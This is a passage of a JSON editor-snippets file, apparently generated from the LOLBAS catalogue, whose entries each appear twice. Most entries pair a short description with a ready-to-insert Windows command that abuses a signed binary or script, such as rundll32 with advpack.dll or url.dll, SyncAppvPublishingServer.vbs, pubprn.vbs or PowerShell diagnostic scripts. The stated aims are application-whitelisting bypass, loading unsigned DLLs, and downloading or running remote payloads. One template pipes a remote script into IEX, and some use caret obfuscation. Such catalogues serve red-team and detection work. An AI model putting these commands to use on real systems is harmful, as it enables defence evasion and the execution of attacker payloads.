        "description": "winrm.vbs is Script used for manage Windows RM settings. it can Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe., requires  privilege, category: AWL Bypass, it can be used for Execute arbitrary, unsigned code via XSL script."
    },
    "CL_Mutexverifiers.ps1 Proxy execution (lolbas)": {
        "prefix": "CL_Mutexverifiers.ps1",
        "body": [
            "CL_Mutexverifiers.ps1 is Proxy execution with CL_Mutexverifiers.ps1. it can Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}${0}",
            "```"
        ],
        "description": "CL_Mutexverifiers.ps1 is Proxy execution with CL_Mutexverifiers.ps1. it can Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "lolbas CL_Mutexverifiers.ps1 Proxy execution": {
        "prefix": "lolbas CL_Mutexverifiers.ps1",
        "body": [
            "CL_Mutexverifiers.ps1 is Proxy execution with CL_Mutexverifiers.ps1. it can Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}${0}",
            "```"
        ],
        "description": "CL_Mutexverifiers.ps1 is Proxy execution with CL_Mutexverifiers.ps1. it can Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "UtilityFunctions.ps1 Execute proxied payload with Microsoft signed binary (lolbas)": {
        "prefix": "UtilityFunctions.ps1",
        "body": [
            "UtilityFunctions.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary.",
            "",
            "```sh",
            "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"${0}",
            "```"
        ],
        "description": "UtilityFunctions.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary."
    },
    "lolbas UtilityFunctions.ps1 Execute proxied payload with Microsoft signed binary": {
        "prefix": "lolbas UtilityFunctions.ps1",
        "body": [
            "UtilityFunctions.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary.",
            "",
            "```sh",
            "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"${0}",
            "```"
        ],
        "description": "UtilityFunctions.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary."
    },
    "Syncappvpublishingserver.vbs Use Powershell host invoked from vbs script (lolbas)": {
        "prefix": "Syncappvpublishingserver.vbs",
        "body": [
            "Syncappvpublishingserver.vbs is Script used related to app-v and publishing server. it can Inject PowerShell script code with the provided arguments, requires  privilege, category: Execute, it can be used for Use Powershell host invoked from vbs script.",
            "",
            "```sh",
            "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"${0}",
            "```"
        ],
        "description": "Syncappvpublishingserver.vbs is Script used related to app-v and publishing server. it can Inject PowerShell script code with the provided arguments, requires  privilege, category: Execute, it can be used for Use Powershell host invoked from vbs script."
    },
    "lolbas Syncappvpublishingserver.vbs Use Powershell host invoked from vbs script": {
        "prefix": "lolbas Syncappvpublishingserver.vbs",
        "body": [
            "Syncappvpublishingserver.vbs is Script used related to app-v and publishing server. it can Inject PowerShell script code with the provided arguments, requires  privilege, category: Execute, it can be used for Use Powershell host invoked from vbs script.",
            "",
            "```sh",
            "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"${0}",
            "```"
        ],
        "description": "Syncappvpublishingserver.vbs is Script used related to app-v and publishing server. it can Inject PowerShell script code with the provided arguments, requires  privilege, category: Execute, it can be used for Use Powershell host invoked from vbs script."
    },
    "Pester.bat Proxy execution (lolbas)": {
        "prefix": "Pester.bat",
        "body": [
            "Pester.bat is Used as part of the Powershell pester. it can Execute code using Pester. Example here executes specified executable., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "Pester.bat ;{PATH:.exe}${0}",
            "```"
        ],
        "description": "Pester.bat is Used as part of the Powershell pester. it can Execute code using Pester. Example here executes specified executable., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "lolbas Pester.bat Proxy execution": {
        "prefix": "lolbas Pester.bat",
        "body": [
            "Pester.bat is Used as part of the Powershell pester. it can Execute code using Pester. Example here executes specified executable., requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "Pester.bat ;{PATH:.exe}${0}",
            "```"
        ],
        "description": "Pester.bat is Used as part of the Powershell pester. it can Execute code using Pester. Example here executes specified executable., requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "Manage-bde.wsf Proxy execution from script (lolbas)": {
        "prefix": "Manage-bde.wsf",
        "body": [
            "Manage-bde.wsf is Script for managing BitLocker. it can Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file., requires  privilege, category: Execute, it can be used for Proxy execution from script.",
            "",
            "```sh",
            "copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf${0}",
            "```"
        ],
        "description": "Manage-bde.wsf is Script for managing BitLocker. it can Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file., requires  privilege, category: Execute, it can be used for Proxy execution from script."
    },
    "lolbas Manage-bde.wsf Proxy execution from script": {
        "prefix": "lolbas Manage-bde.wsf",
        "body": [
            "Manage-bde.wsf is Script for managing BitLocker. it can Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file., requires  privilege, category: Execute, it can be used for Proxy execution from script.",
            "",
            "```sh",
            "copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf${0}",
            "```"
        ],
        "description": "Manage-bde.wsf is Script for managing BitLocker. it can Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file., requires  privilege, category: Execute, it can be used for Proxy execution from script."
    },
    "CL_LoadAssembly.ps1 Execute proxied payload with Microsoft signed binary (lolbas)": {
        "prefix": "CL_LoadAssembly.ps1",
        "body": [
            "CL_LoadAssembly.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary.",
            "",
            "```sh",
            "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\"${0}",
            "```"
        ],
        "description": "CL_LoadAssembly.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary."
    },
    "lolbas CL_LoadAssembly.ps1 Execute proxied payload with Microsoft signed binary": {
        "prefix": "lolbas CL_LoadAssembly.ps1",
        "body": [
            "CL_LoadAssembly.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary.",
            "",
            "```sh",
            "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\"${0}",
            "```"
        ],
        "description": "CL_LoadAssembly.ps1 is PowerShell Diagnostic Script. it can Proxy execute Managed DLL with PowerShell, requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary."
    },
    "Pubprn.vbs Proxy execution (lolbas)": {
        "prefix": "Pubprn.vbs",
        "body": [
            "Pubprn.vbs is Proxy execution with Pubprn.vbs. it can Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection, requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}${0}",
            "```"
        ],
        "description": "Pubprn.vbs is Proxy execution with Pubprn.vbs. it can Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection, requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "lolbas Pubprn.vbs Proxy execution": {
        "prefix": "lolbas Pubprn.vbs",
        "body": [
            "Pubprn.vbs is Proxy execution with Pubprn.vbs. it can Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection, requires  privilege, category: Execute, it can be used for Proxy execution.",
            "",
            "```sh",
            "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}${0}",
            "```"
        ],
        "description": "Pubprn.vbs is Proxy execution with Pubprn.vbs. it can Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection, requires  privilege, category: Execute, it can be used for Proxy execution."
    },
    "Shimgvw.dll Download file from remote location. (lolbas)": {
        "prefix": "Shimgvw.dll",
        "body": [
            "Shimgvw.dll is Photo Gallery Viewer. it can Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'., requires  privilege, category: Download, it can be used for Download file from remote location..",
            "",
            "```sh",
            "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Shimgvw.dll is Photo Gallery Viewer. it can Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'., requires  privilege, category: Download, it can be used for Download file from remote location.."
    },
    "lolbas Shimgvw.dll Download file from remote location.": {
        "prefix": "lolbas Shimgvw.dll",
        "body": [
            "Shimgvw.dll is Photo Gallery Viewer. it can Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'., requires  privilege, category: Download, it can be used for Download file from remote location..",
            "",
            "```sh",
            "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Shimgvw.dll is Photo Gallery Viewer. it can Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'., requires  privilege, category: Download, it can be used for Download file from remote location.."
    },
    "Dfshim.dll Use binary to bypass Application whitelisting (lolbas)": {
        "prefix": "Dfshim.dll",
        "body": [
            "Dfshim.dll is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting.",
            "",
            "```sh",
            "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}${0}",
            "```"
        ],
        "description": "Dfshim.dll is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting."
    },
    "lolbas Dfshim.dll Use binary to bypass Application whitelisting": {
        "prefix": "lolbas Dfshim.dll",
        "body": [
            "Dfshim.dll is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting.",
            "",
            "```sh",
            "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}${0}",
            "```"
        ],
        "description": "Dfshim.dll is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting."
    },
    "Pcwutl.dll Launch an executable. (lolbas)": {
        "prefix": "Pcwutl.dll",
        "body": [
            "Pcwutl.dll is Microsoft HTML Viewer. it can Launch executable by calling the LaunchApplication function., requires  privilege, category: Execute, it can be used for Launch an executable..",
            "",
            "```sh",
            "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}${0}",
            "```"
        ],
        "description": "Pcwutl.dll is Microsoft HTML Viewer. it can Launch executable by calling the LaunchApplication function., requires  privilege, category: Execute, it can be used for Launch an executable.."
    },
    "lolbas Pcwutl.dll Launch an executable.": {
        "prefix": "lolbas Pcwutl.dll",
        "body": [
            "Pcwutl.dll is Microsoft HTML Viewer. it can Launch executable by calling the LaunchApplication function., requires  privilege, category: Execute, it can be used for Launch an executable..",
            "",
            "```sh",
            "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}${0}",
            "```"
        ],
        "description": "Pcwutl.dll is Microsoft HTML Viewer. it can Launch executable by calling the LaunchApplication function., requires  privilege, category: Execute, it can be used for Launch an executable.."
    },
    "PhotoViewer.dll Download file from remote location. (lolbas)": {
        "prefix": "PhotoViewer.dll",
        "body": [
            "PhotoViewer.dll is Windows Photo Viewer. it can Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL., requires  privilege, category: Download, it can be used for Download file from remote location..",
            "",
            "```sh",
            "rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}${0}",
            "```"
        ],
        "description": "PhotoViewer.dll is Windows Photo Viewer. it can Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL., requires  privilege, category: Download, it can be used for Download file from remote location.."
    },
    "lolbas PhotoViewer.dll Download file from remote location.": {
        "prefix": "lolbas PhotoViewer.dll",
        "body": [
            "PhotoViewer.dll is Windows Photo Viewer. it can Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL., requires  privilege, category: Download, it can be used for Download file from remote location..",
            "",
            "```sh",
            "rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}${0}",
            "```"
        ],
        "description": "PhotoViewer.dll is Windows Photo Viewer. it can Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL., requires  privilege, category: Download, it can be used for Download file from remote location.."
    },
    "Url.dll Invoke an HTML Application via mshta.exe (Default Handler). (lolbas)": {
        "prefix": "Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch a HTML application payload by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Invoke an HTML Application via mshta.exe (Default Handler)..",
            "",
            "```sh",
            "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch a HTML application payload by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Invoke an HTML Application via mshta.exe (Default Handler).."
    },
    "lolbas Url.dll Invoke an HTML Application via mshta.exe (Default Handler).": {
        "prefix": "lolbas Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch a HTML application payload by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Invoke an HTML Application via mshta.exe (Default Handler)..",
            "",
            "```sh",
            "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch a HTML application payload by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Invoke an HTML Application via mshta.exe (Default Handler).."
    },
    "Url.dll Load an executable payload by calling a .url file. (lolbas)": {
        "prefix": "Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable payload via proxy through a .url (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file..",
            "",
            "```sh",
            "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable payload via proxy through a .url (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file.."
    },
    "lolbas Url.dll Load an executable payload by calling a .url file.": {
        "prefix": "lolbas Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable payload via proxy through a .url (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file..",
            "",
            "```sh",
            "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable payload via proxy through a .url (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file.."
    },
    "Url.dll Load an executable payload by specifying the file protocol handler (obfuscated). (lolbas)": {
        "prefix": "Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Load an executable payload by specifying the file protocol handler (obfuscated)..",
            "",
            "```sh",
            "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Load an executable payload by specifying the file protocol handler (obfuscated).."
    },
    "lolbas Url.dll Load an executable payload by specifying the file protocol handler (obfuscated).": {
        "prefix": "lolbas Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Load an executable payload by specifying the file protocol handler (obfuscated)..",
            "",
            "```sh",
            "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Load an executable payload by specifying the file protocol handler (obfuscated).."
    },
    "Url.dll Launch an executable. (lolbas)": {
        "prefix": "Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Launch an executable..",
            "",
            "```sh",
            "rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Launch an executable.."
    },
    "lolbas Url.dll Launch an executable.": {
        "prefix": "lolbas Url.dll",
        "body": [
            "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Launch an executable..",
            "",
            "```sh",
            "rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Url.dll is Internet Shortcut Shell Extension DLL.. it can Launch an executable by calling FileProtocolHandler., requires  privilege, category: Execute, it can be used for Launch an executable.."
    },
    "Zipfldr.dll Launch an executable. (lolbas)": {
        "prefix": "Zipfldr.dll",
        "body": [
            "Zipfldr.dll is Compressed Folder library. it can Launch an executable payload by calling RouteTheCall (obfuscated)., requires  privilege, category: Execute, it can be used for Launch an executable..",
            "",
            "```sh",
            "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e${0}",
            "```"
        ],
        "description": "Zipfldr.dll is Compressed Folder library. it can Launch an executable payload by calling RouteTheCall (obfuscated)., requires  privilege, category: Execute, it can be used for Launch an executable.."
    },
    "lolbas Zipfldr.dll Launch an executable.": {
        "prefix": "lolbas Zipfldr.dll",
        "body": [
            "Zipfldr.dll is Compressed Folder library. it can Launch an executable payload by calling RouteTheCall (obfuscated)., requires  privilege, category: Execute, it can be used for Launch an executable..",
            "",
            "```sh",
            "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e${0}",
            "```"
        ],
        "description": "Zipfldr.dll is Compressed Folder library. it can Launch an executable payload by calling RouteTheCall (obfuscated)., requires  privilege, category: Execute, it can be used for Launch an executable.."
    },
    "Ieadvpack.dll Run local or remote script(let) code through INF file specification. (lolbas)": {
        "prefix": "Ieadvpack.dll",
        "body": [
            "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification..",
            "",
            "```sh",
            "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,${0}",
            "```"
        ],
        "description": "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification.."
    },
    "lolbas Ieadvpack.dll Run local or remote script(let) code through INF file specification.": {
        "prefix": "lolbas Ieadvpack.dll",
        "body": [
            "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification..",
            "",
            "```sh",
            "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,${0}",
            "```"
        ],
        "description": "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification.."
    },
    "Ieadvpack.dll Load a DLL payload. (lolbas)": {
        "prefix": "Ieadvpack.dll",
        "body": [
            "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload..",
            "",
            "```sh",
            "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}${0}",
            "```"
        ],
        "description": "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload.."
    },
    "lolbas Ieadvpack.dll Load a DLL payload.": {
        "prefix": "lolbas Ieadvpack.dll",
        "body": [
            "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload..",
            "",
            "```sh",
            "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}${0}",
            "```"
        ],
        "description": "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload.."
    },
    "Ieadvpack.dll Run an executable payload. (lolbas)": {
        "prefix": "Ieadvpack.dll",
        "body": [
            "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload..",
            "",
            "```sh",
            "rundll32 ieadvpack.dll, RegisterOCX {CMD}${0}",
            "```"
        ],
        "description": "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload.."
    },
    "lolbas Ieadvpack.dll Run an executable payload.": {
        "prefix": "lolbas Ieadvpack.dll",
        "body": [
            "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload..",
            "",
            "```sh",
            "rundll32 ieadvpack.dll, RegisterOCX {CMD}${0}",
            "```"
        ],
        "description": "Ieadvpack.dll is INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload.."
    },
    "Ieframe.dll Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed. (lolbas)": {
        "prefix": "Ieframe.dll",
        "body": [
            "Ieframe.dll is Internet Browser DLL for translating HTML code.. it can Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed..",
            "",
            "```sh",
            "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}${0}",
            "```"
        ],
        "description": "Ieframe.dll is Internet Browser DLL for translating HTML code.. it can Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.."
    },
    "lolbas Ieframe.dll Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.": {
        "prefix": "lolbas Ieframe.dll",
        "body": [
            "Ieframe.dll is Internet Browser DLL for translating HTML code.. it can Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed..",
            "",
            "```sh",
            "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}${0}",
            "```"
        ],
        "description": "Ieframe.dll is Internet Browser DLL for translating HTML code.. it can Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.."
    },
    "Advpack.dll Run local or remote script(let) code through INF file specification. (lolbas)": {
        "prefix": "Advpack.dll",
        "body": [
            "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification..",
            "",
            "```sh",
            "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,${0}",
            "```"
        ],
        "description": "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification.."
    },
    "lolbas Advpack.dll Run local or remote script(let) code through INF file specification.": {
        "prefix": "lolbas Advpack.dll",
        "body": [
            "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification..",
            "",
            "```sh",
            "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,${0}",
            "```"
        ],
        "description": "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification.."
    },
    "Advpack.dll Load a DLL payload. (lolbas)": {
        "prefix": "Advpack.dll",
        "body": [
            "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload..",
            "",
            "```sh",
            "rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}${0}",
            "```"
        ],
        "description": "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload.."
    },
    "lolbas Advpack.dll Load a DLL payload.": {
        "prefix": "lolbas Advpack.dll",
        "body": [
            "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload..",
            "",
            "```sh",
            "rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}${0}",
            "```"
        ],
        "description": "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch a DLL payload by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Load a DLL payload.."
    },
    "Advpack.dll Run an executable payload. (lolbas)": {
        "prefix": "Advpack.dll",
        "body": [
